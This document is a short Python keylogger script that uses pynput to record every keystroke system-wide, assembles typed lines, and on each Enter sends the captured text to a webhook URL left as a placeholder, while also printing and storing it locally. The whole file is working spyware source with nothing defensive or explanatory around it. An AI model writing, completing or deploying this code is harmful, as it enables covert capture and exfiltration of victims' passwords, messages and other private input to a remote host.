from pynput import keyboard
import requests

global_val = []
tmp = ""

def on_press(key):
    # Use the 'global' keyword to modify variables defined outside the function
    global tmp, global_val 

    try:
        if key == keyboard.Key.enter:
            print(f"\nClicked enter. Storing: {tmp}")
            try:
                res = requests.get("WEBHOOK URL"+tmp)
                res.raise_for_status()
            except requests.exceptions.HTTPError as err:
                print(f"HTTP error occurred: {err}")
            global_val.append(tmp)
            tmp = ""  # Reset for the next sentence
            print(f"Current List: {global_val}")
        
        elif key == keyboard.Key.space:
            tmp += " "
            
        elif key == keyboard.Key.backspace:
            tmp = tmp[:-1] # Remove last character

        else:
            # key.char gets the actual letter (e.g., 'a' instead of Key.a)
            tmp += key.char 
            
    except AttributeError:
        # Handles special keys like Shift, Ctrl, etc. that don't have a .char
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
